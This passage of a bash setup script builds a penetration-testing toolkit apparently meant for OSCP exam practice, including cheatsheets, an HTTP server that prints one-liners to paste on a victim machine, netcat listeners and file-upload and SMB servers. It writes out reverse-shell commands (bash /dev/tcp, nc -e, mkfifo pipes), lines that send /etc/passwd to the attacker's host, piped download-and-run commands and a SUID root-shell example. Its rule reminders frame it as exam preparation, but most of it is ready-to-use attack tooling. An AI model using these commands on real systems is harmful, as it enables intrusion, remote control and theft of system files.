wget http://ATTACKER/command-generators/suid3num.py -O /tmp/suid.py
python3 /tmp/suid.py

# Output shows:
# - Default SUID binaries (ignore these)
# - Custom SUID binaries (check these!)
# - GTFOBins exploits for each binary
```

## ⚡ GTFONow - Safe Enumeration Mode

```bash
wget http://ATTACKER/command-generators/gtfonow.py -O /tmp/gtfo.py

# SAFE - Level 0: Only enumerate, show commands
python3 /tmp/gtfo.py -l 0

# DANGER - Higher levels auto-exploit:
# python3 /tmp/gtfo.py -l 1   # DON'T USE IN OSCP
# python3 /tmp/gtfo.py -l 2   # DON'T USE IN OSCP
```

## traitor - Vulnerability Finder

```bash
wget http://ATTACKER/privesc/traitor-amd64 -O /tmp/traitor
chmod +x /tmp/traitor

# SAFE - Just find vulnerabilities, show commands
/tmp/traitor

# SAFE - With password (for sudo checks)
/tmp/traitor -p
# (enter password when prompted)

# DANGER - Auto-exploit flags:
# /tmp/traitor -a            # DON'T USE IN OSCP
# /tmp/traitor -e <exploit>  # DON'T USE IN OSCP
```

## LinEsc - Comprehensive Enumeration

```bash
wget http://ATTACKER/command-generators/LinEsc/LinEsc.sh -O /tmp/linesc.sh
chmod +x /tmp/linesc.sh
/tmp/linesc.sh

# Shows:
# - SUID binaries with exploit commands
# - Sudo permissions with exploit commands
# - Capabilities with exploit commands
# - Cron jobs
# - Writable files
```

## OSCP Workflow with Command Generators

### Step 1: Run LinPEAS (identify vectors)
```bash
./linpeas.sh | tee output.txt
```

### Step 2: For interesting SUID binaries
```bash
# Found: /usr/bin/find with SUID
python3 gtfoblookup.py linux shell suid find

# Output:
# find . -exec /bin/sh -p \; -quit
```

### Step 3: Run the command manually
```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
whoami  # root!
```

### Step 4: Document in your report
```
Found SUID binary: /usr/bin/find
Used GTFOBins command: find . -exec /bin/sh -p \; -quit
Result: Root shell obtained
```

## OSCP Rules Reminder

**ALLOWED:**
- Tools that SHOW exploit commands
- Running those commands manually
- Understanding what you're doing

**NOT ALLOWED:**
- Tools that auto-exploit
- gtfonow -l 1 or -l 2
- traitor -a or -e
- Any automatic exploitation

**Rule of thumb:** If you didn't type the exploit command yourself, it's probably not allowed!

EOF
}

#=============================================================================
# SERVER SCRIPTS
#=============================================================================

create_server_scripts() {
    log "HEADER" "Creating Server Scripts"
    
    # HTTP server - Professional version with port tracking
    cat > "${TOOLS_DIR}/serve-http.sh" << 'HTTPEOF'
#!/bin/bash
#=============================================================================
# HTTP Server - Serves tools with ready-to-use one-liners
#=============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PORT_FILE="${SCRIPT_DIR}/.http_port"

get_random_port() {
    echo $((RANDOM % 2000 + 8000))
}

is_port_free() {
    local port=$1
    ! (ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null) | grep -q ":${port} "
}

find_free_port() {
    local port=$1
    local max_attempts=50
    local attempt=0
    
    while [ $attempt -lt $max_attempts ]; do
        if is_port_free $port; then
            echo $port
            return 0
        fi
        port=$((port + 1))
        attempt=$((attempt + 1))
    done
    get_random_port
}

get_ip() {
    ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
    ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
    hostname -I 2>/dev/null | awk '{print $1}' || \
    echo "127.0.0.1"
}

# Cleanup on exit
cleanup() {
    rm -f "${PORT_FILE}" 2>/dev/null
}
trap cleanup EXIT

# Main
REQUESTED_PORT="${1:-$(get_random_port)}"
PORT=$(find_free_port $REQUESTED_PORT)
IP=$(get_ip)

# Save port to file so listener.sh can avoid it
echo "${PORT}" > "${PORT_FILE}"

if [ "$PORT" != "$REQUESTED_PORT" ] && [ -n "$1" ]; then
    echo "[!] Port $REQUESTED_PORT in use, using $PORT instead"
fi

clear
echo "============================================================================="
echo "  HTTP SERVER"
echo "============================================================================="
echo ""
echo "Server:  http://${IP}:${PORT}/"
echo "Serving: ${SCRIPT_DIR}"
echo ""
echo "============================================================================="
echo "  ONE-LINERS FOR TARGET (copy and paste on victim machine)"
echo "============================================================================="
echo ""
echo "-- ENUMERATION --"
echo ""
echo "# LinPEAS (run first, look for RED/YELLOW output)"
echo "wget http://${IP}:${PORT}/enumeration/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh"
echo ""
echo "# LinPEAS in-memory (no file on disk)"
echo "curl -sL http://${IP}:${PORT}/enumeration/linpeas.sh | sh"
echo ""
echo "# LSE - Linux Smart Enumeration"
echo "wget http://${IP}:${PORT}/enumeration/lse.sh -O /tmp/lse.sh && chmod +x /tmp/lse.sh && /tmp/lse.sh -l1"
echo ""
echo "# LinEnum"
echo "wget http://${IP}:${PORT}/enumeration/LinEnum.sh -O /tmp/le.sh && chmod +x /tmp/le.sh && /tmp/le.sh"
echo ""
echo "-- PROCESS MONITORING (find hidden cron jobs) --"
echo ""
echo "# pspy64 (64-bit)"
echo "wget http://${IP}:${PORT}/process-monitor/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy"
echo ""
echo "# pspy32 (32-bit)"
echo "wget http://${IP}:${PORT}/process-monitor/pspy32 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy"
echo ""
echo "-- EXPLOIT SUGGESTERS --"
echo ""
echo "# Linux Exploit Suggester"
echo "wget http://${IP}:${PORT}/exploit-suggesters/linux-exploit-suggester.sh -O /tmp/les.sh && chmod +x /tmp/les.sh && /tmp/les.sh"
echo ""
echo "-- COMMAND GENERATORS (show exploit commands, OSCP safe) --"
echo ""
echo "# suid3num - SUID finder + GTFOBins commands"
echo "wget http://${IP}:${PORT}/command-generators/suid3num.py -O /tmp/suid.py && python3 /tmp/suid.py"
echo ""
echo "# GTFONow - SAFE ENUM ONLY (use -l 0)"
echo "wget http://${IP}:${PORT}/command-generators/gtfonow.py -O /tmp/gtfo.py && python3 /tmp/gtfo.py -l 0"
echo ""
echo "# traitor - Find vulns (NO -a flag)"
echo "wget http://${IP}:${PORT}/privesc/traitor-amd64 -O /tmp/traitor && chmod +x /tmp/traitor && /tmp/traitor"
echo ""
echo "-- TUNNELING --"
echo ""
echo "# Chisel (64-bit)"
echo "wget http://${IP}:${PORT}/tunneling/chisel -O /tmp/chisel && chmod +x /tmp/chisel"
echo "# Then run: /tmp/chisel client ${IP}:8080 R:socks"
echo ""
echo "-- STATIC BINARIES --"
echo ""
echo "# ncat"
echo "wget http://${IP}:${PORT}/transfer/ncat -O /tmp/nc && chmod +x /tmp/nc"
echo ""
echo "# socat"
echo "wget http://${IP}:${PORT}/transfer/socat -O /tmp/socat && chmod +x /tmp/socat"
echo ""
echo "-- SHELLS --"
echo ""
echo "# PHP reverse shell"
echo "wget http://${IP}:${PORT}/shells/php-reverse-shell.php -O /tmp/shell.php"
echo ""
echo "============================================================================="
echo "[*] Server starting on port ${PORT}... Press Ctrl+C to stop"
echo "============================================================================="
echo ""

cd "${SCRIPT_DIR}"

if command -v python3 &>/dev/null; then
    python3 -m http.server ${PORT}
elif command -v python2 &>/dev/null; then
    python2 -m SimpleHTTPServer ${PORT}
elif command -v python &>/dev/null; then
    python -m http.server ${PORT} 2>/dev/null || python -m SimpleHTTPServer ${PORT}
elif command -v php &>/dev/null; then
    php -S 0.0.0.0:${PORT}
elif command -v ruby &>/dev/null; then
    ruby -run -ehttpd . -p${PORT}
else
    echo "[-] No HTTP server available. Install python3, php, or ruby."
    exit 1
fi
HTTPEOF
    chmod +x "${TOOLS_DIR}/serve-http.sh"

    # One-liners generator - creates file with current IP
    cat > "${TOOLS_DIR}/generate-oneliners.sh" << 'GENEOF'
#!/bin/bash
#=============================================================================
# Generate one-liners file with current IP and port
#=============================================================================

PORT="${1:-8000}"
IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
     ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
     hostname -I 2>/dev/null | awk '{print $1}')

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUTPUT="${SCRIPT_DIR}/ONELINERS.txt"

cat > "${OUTPUT}" << EOF
#=============================================================================
# LINUX ARSENAL - ONE-LINERS FOR TARGET
# Server: http://${IP}:${PORT}/
# Generated: $(date)
#=============================================================================

#-----------------------------------------------------------------------------
# ENUMERATION (Run these first)
#-----------------------------------------------------------------------------

# LinPEAS - Comprehensive enumeration (look for RED/YELLOW in output)
wget http://${IP}:${PORT}/enumeration/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh

# LinPEAS - In memory (no file on disk)
curl -sL http://${IP}:${PORT}/enumeration/linpeas.sh | sh

# LinPEAS - Save output to file
wget http://${IP}:${PORT}/enumeration/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/linpeas.txt

# LinPEAS small (minimal, faster)
wget http://${IP}:${PORT}/enumeration/linpeas_small.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh

# LSE - Linux Smart Enumeration (level 1 = useful info)
wget http://${IP}:${PORT}/enumeration/lse.sh -O /tmp/lse.sh && chmod +x /tmp/lse.sh && /tmp/lse.sh -l1

# LSE - Full dump (level 2)
wget http://${IP}:${PORT}/enumeration/lse.sh -O /tmp/lse.sh && chmod +x /tmp/lse.sh && /tmp/lse.sh -l2

# LinEnum
wget http://${IP}:${PORT}/enumeration/LinEnum.sh -O /tmp/le.sh && chmod +x /tmp/le.sh && /tmp/le.sh

# linuxprivchecker (Python)
wget http://${IP}:${PORT}/enumeration/linuxprivchecker.py -O /tmp/lpc.py && python /tmp/lpc.py

# linuxprivchecker (Python3)
wget http://${IP}:${PORT}/enumeration/linuxprivchecker.py -O /tmp/lpc.py && python3 /tmp/lpc.py

# unix-privesc-check
wget http://${IP}:${PORT}/enumeration/unix-privesc-check -O /tmp/upc && chmod +x /tmp/upc && /tmp/upc standard

#-----------------------------------------------------------------------------
# PROCESS MONITORING (Critical for finding cron jobs)
#-----------------------------------------------------------------------------

# pspy64 (64-bit systems) - watch for 2-5 minutes
wget http://${IP}:${PORT}/process-monitor/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy

# pspy64 with file events
wget http://${IP}:${PORT}/process-monitor/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy -pf -i 1000

# pspy32 (32-bit systems)
wget http://${IP}:${PORT}/process-monitor/pspy32 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy

# pspy64s (static, smaller)
wget http://${IP}:${PORT}/process-monitor/pspy64s -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy

# pspy32s (static, smaller)
wget http://${IP}:${PORT}/process-monitor/pspy32s -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy

#-----------------------------------------------------------------------------
# EXPLOIT SUGGESTERS (Kernel vulnerabilities)
#-----------------------------------------------------------------------------

# Linux Exploit Suggester
wget http://${IP}:${PORT}/exploit-suggesters/linux-exploit-suggester.sh -O /tmp/les.sh && chmod +x /tmp/les.sh && /tmp/les.sh

# Linux Exploit Suggester 2 (Perl)
wget http://${IP}:${PORT}/exploit-suggesters/linux-exploit-suggester-2.pl -O /tmp/les2.pl && perl /tmp/les2.pl

#-----------------------------------------------------------------------------
# COMMAND GENERATORS (Show exploit commands - OSCP SAFE)
# These tools SHOW you the commands to run, don't auto-exploit
#-----------------------------------------------------------------------------

# suid3num - SUID finder + GTFOBins commands
wget http://${IP}:${PORT}/command-generators/suid3num.py -O /tmp/suid.py && python3 /tmp/suid.py

# GTFONow - SAFE ENUM ONLY (use -l 0)
# WARNING: Only use -l 0, higher levels auto-exploit
wget http://${IP}:${PORT}/command-generators/gtfonow.py -O /tmp/gtfo.py && python3 /tmp/gtfo.py -l 0

# traitor - Find vulns (NO -a flag)
# WARNING: Don't use -a flag (auto-exploit)
wget http://${IP}:${PORT}/privesc/traitor-amd64 -O /tmp/traitor && chmod +x /tmp/traitor && /tmp/traitor

#-----------------------------------------------------------------------------
# PRIVILEGE ESCALATION TOOLS
#-----------------------------------------------------------------------------

# traitor - 32-bit
wget http://${IP}:${PORT}/privesc/traitor-386 -O /tmp/traitor && chmod +x /tmp/traitor && /tmp/traitor

#-----------------------------------------------------------------------------
# TUNNELING / PIVOTING
#-----------------------------------------------------------------------------

# Chisel client (SOCKS proxy) - 64-bit
wget http://${IP}:${PORT}/tunneling/chisel -O /tmp/chisel && chmod +x /tmp/chisel
# Then run: /tmp/chisel client ${IP}:8080 R:socks

# Chisel client - 32-bit
wget http://${IP}:${PORT}/tunneling/chisel_386 -O /tmp/chisel && chmod +x /tmp/chisel

# Ligolo-ng agent
wget http://${IP}:${PORT}/tunneling/agent -O /tmp/agent && chmod +x /tmp/agent
# Then run: /tmp/agent -connect ${IP}:11601 -ignore-cert

#-----------------------------------------------------------------------------
# STATIC BINARIES (for restricted shells)
#-----------------------------------------------------------------------------

# ncat (netcat)
wget http://${IP}:${PORT}/transfer/ncat -O /tmp/nc && chmod +x /tmp/nc

# socat
wget http://${IP}:${PORT}/transfer/socat -O /tmp/socat && chmod +x /tmp/socat

# static bash
wget http://${IP}:${PORT}/static-binaries/bash -O /tmp/bash && chmod +x /tmp/bash

# static nmap
wget http://${IP}:${PORT}/static-binaries/nmap -O /tmp/nmap && chmod +x /tmp/nmap

# static curl
wget http://${IP}:${PORT}/static-binaries/curl -O /tmp/curl && chmod +x /tmp/curl

#-----------------------------------------------------------------------------
# REVERSE SHELLS
#-----------------------------------------------------------------------------

# PHP reverse shell (edit IP/PORT inside first)
wget http://${IP}:${PORT}/shells/php-reverse-shell.php -O /tmp/shell.php

# Perl reverse shell
wget http://${IP}:${PORT}/shells/perl-reverse-shell.pl -O /tmp/shell.pl

#-----------------------------------------------------------------------------
# ALTERNATIVE DOWNLOAD METHODS (if wget not available)
#-----------------------------------------------------------------------------

# Using curl
curl http://${IP}:${PORT}/enumeration/linpeas.sh -o /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh

# Using curl (in-memory)
curl -sL http://${IP}:${PORT}/enumeration/linpeas.sh | bash

# Using fetch (FreeBSD)
fetch http://${IP}:${PORT}/enumeration/linpeas.sh -o /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh

#-----------------------------------------------------------------------------
# UPLOAD FILES FROM TARGET TO ATTACKER
#-----------------------------------------------------------------------------

# Using curl (attacker runs: nc -lvnp 9999 > received.txt)
curl --data-binary @/etc/passwd http://${IP}:9999/

# Using nc
cat /etc/passwd | nc ${IP} 9999

# Using /dev/tcp
cat /etc/passwd > /dev/tcp/${IP}/9999

EOF

echo "[+] Generated: ${OUTPUT}"
echo "[+] Server: ${IP}:${PORT}"
echo ""
echo "View with: cat ${OUTPUT}"
echo "Start server: ./serve-http.sh ${PORT}"
GENEOF
    chmod +x "${TOOLS_DIR}/generate-oneliners.sh"
    
    # NC listener - Avoids HTTP server port
    cat > "${TOOLS_DIR}/listen.sh" << 'EOF'
#!/bin/bash
#=============================================================================
# NC Listener - Auto-selects free port
#=============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PORT_FILE="${SCRIPT_DIR}/.http_port"

is_port_free() {
    ! (ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null) | grep -q ":${1} "
}

get_ip() {
    ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
    ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
    hostname -I 2>/dev/null | awk '{print $1}' || \
    echo "127.0.0.1"
}

# Read HTTP server port if running
HTTP_PORT=""
if [ -f "${PORT_FILE}" ]; then
    HTTP_PORT=$(cat "${PORT_FILE}" 2>/dev/null)
fi

# Default port
PORT="${1:-4444}"

# Check if requested port is in use (either by HTTP server or anything else)
if ! is_port_free $PORT; then
    echo "[!] Port $PORT is already in use"
    # Try alternative ports
    for try_port in 4444 4445 4446 9001 9002 5555 6666 7777 8888; do
        if [ "$try_port" != "$HTTP_PORT" ] && is_port_free $try_port; then
            PORT=$try_port
            echo "[+] Using port $PORT instead"
            break
        fi
    done
    # Final check
    if ! is_port_free $PORT; then
        echo "[-] Could not find free port. Try specifying one manually."
        exit 1
    fi
fi

IP=$(get_ip)

echo ""
echo "============================================================================="
echo "  NC LISTENER"
echo "============================================================================="
echo ""
echo "Listening on: ${IP}:${PORT}"
echo ""
echo "Reverse shell commands for target:"
echo ""
echo "  bash -i >& /dev/tcp/${IP}/${PORT} 0>&1"
echo ""
echo "  nc ${IP} ${PORT} -e /bin/bash"
echo ""
echo "  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${IP} ${PORT} >/tmp/f"
echo ""
echo "[*] Waiting for connection..."
echo ""

nc -lvnp ${PORT}
EOF
    chmod +x "${TOOLS_DIR}/listen.sh"
    
    # rlwrap NC listener
    cat > "${TOOLS_DIR}/listen-rlwrap.sh" << 'EOF'
#!/bin/bash
#=============================================================================
# rlwrap NC Listener - Better shell with history/arrow keys
#=============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PORT_FILE="${SCRIPT_DIR}/.http_port"

is_port_free() {
    ! (ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null) | grep -q ":${1} "
}

PORT="${1:-4444}"

# Check if port is in use
if ! is_port_free $PORT; then
    echo "[!] Port $PORT in use"
    for try_port in 4444 4445 4446 9001 9002; do
        if is_port_free $try_port; then
            PORT=$try_port
            echo "[+] Using port $PORT"
            break
        fi
    done
fi

if ! command -v rlwrap &>/dev/null; then
    echo "[!] rlwrap not installed, using regular nc"
    echo "    Install with: sudo apt install rlwrap"
    exec nc -lvnp ${PORT}
fi

IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')

echo ""
echo "[+] rlwrap NC Listener on ${IP}:${PORT}"
echo "[*] Arrow keys and history enabled"
echo ""

rlwrap nc -lvnp ${PORT}
EOF
    chmod +x "${TOOLS_DIR}/listen-rlwrap.sh"
    
    # Upload server (receive files FROM target)
    cat > "${TOOLS_DIR}/serve-upload.sh" << 'EOF'
#!/bin/bash
#=============================================================================
# Upload Server - Receive files from target
#=============================================================================

PORT="${1:-8080}"
UPLOAD_DIR="${2:-.}"

IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')

mkdir -p "$UPLOAD_DIR" 2>/dev/null

echo ""
echo "============================================================================="
echo "  UPLOAD SERVER"
echo "============================================================================="
echo ""
echo "Listening: ${IP}:${PORT}"
echo "Save to:   $(realpath $UPLOAD_DIR)"
echo ""
echo "Upload from target:"
echo "  curl -X POST -F 'file=@/etc/passwd' http://${IP}:${PORT}/upload"
echo "  wget --post-file=/etc/passwd http://${IP}:${PORT}/upload"
echo ""

python3 << PYEOF
import http.server
import socketserver
import cgi
import os

class UploadHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_type = self.headers.get('Content-Type', '')
        
        if 'multipart/form-data' in content_type:
            form = cgi.FieldStorage(
                fp=self.rfile,
                headers=self.headers,
                environ={'REQUEST_METHOD': 'POST'}
            )
            if 'file' in form:
                file_item = form['file']
                filename = os.path.basename(file_item.filename)
                filepath = os.path.join('${UPLOAD_DIR}', filename)
                with open(filepath, 'wb') as f:
                    f.write(file_item.file.read())
                print(f"[+] Received: {filename}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(f"Uploaded: {filename}".encode())
                return
        
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        filename = f"upload_{os.urandom(4).hex()}.txt"
        filepath = os.path.join('${UPLOAD_DIR}', filename)
        with open(filepath, 'wb') as f:
            f.write(body)
        print(f"[+] Received: {filename}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(f"Uploaded: {filename}".encode())

with socketserver.TCPServer(("", ${PORT}), UploadHandler) as httpd:
    print(f"[*] Waiting for uploads on port ${PORT}...")
    httpd.serve_forever()
PYEOF
EOF
    chmod +x "${TOOLS_DIR}/serve-upload.sh"

    # SMB Server
    cat > "${TOOLS_DIR}/serve-smb.sh" << 'EOF'
#!/bin/bash
#=============================================================================
# SMB Server - For Windows targets
#=============================================================================

SHARE_NAME="${1:-tools}"
SHARE_PATH="${2:-.}"

IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')

echo ""
echo "============================================================================="
echo "  SMB SERVER"
echo "============================================================================="
echo ""
echo "Share:  \\\\${IP}\\${SHARE_NAME}"
echo "Path:   $(realpath $SHARE_PATH)"
echo ""
echo "From Windows target:"
echo "  copy \\\\${IP}\\${SHARE_NAME}\\file.exe C:\\Windows\\Temp\\"
echo "  \\\\${IP}\\${SHARE_NAME}\\mimikatz.exe"
echo ""

if command -v impacket-smbserver &>/dev/null; then
    impacket-smbserver -smb2support "${SHARE_NAME}" "${SHARE_PATH}"
elif [ -f "/usr/share/doc/python3-impacket/examples/smbserver.py" ]; then
    python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support "${SHARE_NAME}" "${SHARE_PATH}"
elif [ -d "$(dirname $0)/network/impacket" ]; then
    python3 "$(dirname $0)/network/impacket/examples/smbserver.py" -smb2support "${SHARE_NAME}" "${SHARE_PATH}"
else
    echo "[-] impacket-smbserver not found"
    echo "    Install with: pip3 install impacket"
    exit 1
fi
EOF
    chmod +x "${TOOLS_DIR}/serve-smb.sh"
    
    log "INFO" "Created server scripts"
}

#=============================================================================
# INVENTORY & CLEANUP
#=============================================================================

generate_inventory() {
    log "HEADER" "Generating Inventory & One-liners"
    
    # Generate one-liners with default port
    bash "${TOOLS_DIR}/generate-oneliners.sh" 8000 >/dev/null 2>&1
    
    cat > "${TOOLS_DIR}/INVENTORY.md" << EOF
# Linux Arsenal Inventory

Generated: $(date)
Location: ${TOOLS_DIR}

## Tool Categories

### Enumeration Scripts
$(find "${TOOLS_DIR}/enumeration" -type f 2>/dev/null | wc -l) files
- linpeas.sh (BEST - use this first)
- linpeas_small.sh (minimal version)
- lse.sh (Linux Smart Enumeration)
- LinEnum.sh
- linuxprivchecker.py
- unix-privesc-check

### Exploit Suggesters
$(find "${TOOLS_DIR}/exploit-suggesters" -type f 2>/dev/null | wc -l) files
- linux-exploit-suggester.sh
- linux-exploit-suggester-2.pl

### Command Generators (OSCP Safe!)
$(find "${TOOLS_DIR}/command-generators" -type f 2>/dev/null | wc -l) files
- GTFOBLookup - CLI to query GTFOBins
- suid3num.py - SUID finder + commands
- gtfonow.py - Enum mode (use -l 0 only!)
- LinEsc - Full enum + commands

### Process Monitors
$(find "${TOOLS_DIR}/process-monitor" -type f 2>/dev/null | wc -l) files
- pspy64, pspy32 (CRITICAL for cron jobs!)
- pspy64s, pspy32s (static/smaller)

### PrivEsc Tools
- SUDO_KILLER
- GTFOBins (offline)
- suid3num.py
- traitor

### Tunneling
- chisel (amd64, 386)
- ligolo-ng (proxy + agent)

### Static Binaries
- bash, busybox, curl, nmap
- socat, ncat, tcpdump, strace, gdb

### Server Scripts
- serve-http.sh    (HTTP server, auto port)
- serve-smb.sh     (SMB for Windows)
- serve-upload.sh  (receive files)
- listen.sh        (NC listener)
- listen-rlwrap.sh (NC with history)

## Quick Start

\`\`\`bash
# Serve tools via HTTP (auto selects free port!)
cd ${TOOLS_DIR} && ./serve-http.sh

# Start listener
./listen.sh

# Transfer to target
wget http://YOURIP:PORT/enumeration/linpeas.sh -O /tmp/lp.sh
chmod +x /tmp/lp.sh
/tmp/lp.sh
\`\`\`

## OSCP Workflow

1. Transfer linpeas.sh → Run → Check RED/YELLOW
2. Transfer pspy → Run → Watch for cron jobs
3. Found SUID/sudo? → Use command generators:
   - python3 suid3num.py (shows GTFOBins commands)
   - python3 gtfonow.py -l 0 (enum only!)
   - traitor (no -a flag!)
4. Run generated commands MANUALLY
5. Document everything for your report

## Tool Counts
- Shell Scripts: $(find "${TOOLS_DIR}" -name "*.sh" -type f 2>/dev/null | wc -l)
- Python Scripts: $(find "${TOOLS_DIR}" -name "*.py" -type f 2>/dev/null | wc -l)
- Executables: $(find "${TOOLS_DIR}" -type f -executable 2>/dev/null | wc -l)
- Repositories: $(find "${TOOLS_DIR}" -maxdepth 2 -type d -name ".git" 2>/dev/null | wc -l)
EOF

    log "INFO" "Generated INVENTORY.md"
}

cleanup() {
    log "HEADER" "Cleaning Up"
    
    rm -rf "${TEMP_DIR}" 2>/dev/null
    find "${TOOLS_DIR}" -type d -empty -delete 2>/dev/null
    chmod +x "${TOOLS_DIR}"/*.sh 2>/dev/null
    
    log "INFO" "Cleanup complete"
}

print_summary() {
    local IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')
    
    echo ""
    echo "+-----------------------------------------------------------------------------+"
    echo "|  DOWNLOAD COMPLETE                                                          |"
    echo "+-----------------------------------------------------------------------------+"
    echo ""
    echo "Tools Directory: ${TOOLS_DIR}"
    echo "Your IP:         ${IP}"
    echo ""
    echo "QUICK START"
    echo "-----------"
    echo ""
    echo "# Start HTTP server (shows one-liners for all tools):"
    echo "  cd ${TOOLS_DIR} && ./serve-http.sh"
    echo ""
    echo "# Start listener (auto-avoids HTTP server port):"
    echo "  ./listen.sh"
    echo ""
    echo "# Regenerate one-liners file for specific port:"
    echo "  ./generate-oneliners.sh 8080 && cat ONELINERS.txt"
    echo ""
    echo "FILES"
    echo "-----"
    echo "  ONELINERS.txt                        - Copy-paste commands for target"
    echo "  cheatsheets/TOOLS-QUICK-REF.md       - Tool usage guide"
    echo "  cheatsheets/COMMAND-GENERATORS.md    - How to use command generators"
    echo "  cheatsheets/PRIVESC-CHECKLIST.md     - PrivEsc checklist"
    echo ""
    echo "OSCP WORKFLOW"
    echo "-------------"
    echo "  1. Start server:  ./serve-http.sh"
    echo "  2. On target, copy one-liner from server output"
    echo "  3. Run linpeas first, look for RED/YELLOW"
    echo "  4. Run pspy to find cron jobs"
    echo "  5. Use command generators to get exploit commands"
    echo "  6. Run exploit commands MANUALLY"
    echo ""
    echo "SCRIPTS"
    echo "-------"
    echo "  serve-http.sh        - HTTP server with one-liners"
    echo "  listen.sh            - NC listener (auto-avoids HTTP port)"
    echo "  listen-rlwrap.sh     - NC with arrow keys/history"
    echo "  serve-smb.sh         - SMB server for Windows"
    echo "  serve-upload.sh      - Receive files from target"
    echo "  generate-oneliners.sh - Regenerate ONELINERS.txt"
    echo ""
    echo "[+] Ready. Run: cd ${TOOLS_DIR} && ./serve-http.sh"
}

#=============================================================================
# MAIN
#=============================================================================

main() {
    banner
    
    log "INFO" "Starting Linux Arsenal - Target: ${TOOLS_DIR}"
    
    check_dependencies
    create_directories
    download_enumeration_scripts
    download_privesc_tools
    download_tunneling_tools
    download_shells_and_transfer
    download_static_binaries
    download_network_tools
    clone_useful_repos
    create_cheatsheets
    create_server_scripts
    generate_inventory
    cleanup
    
    print_summary
}

main "$@"
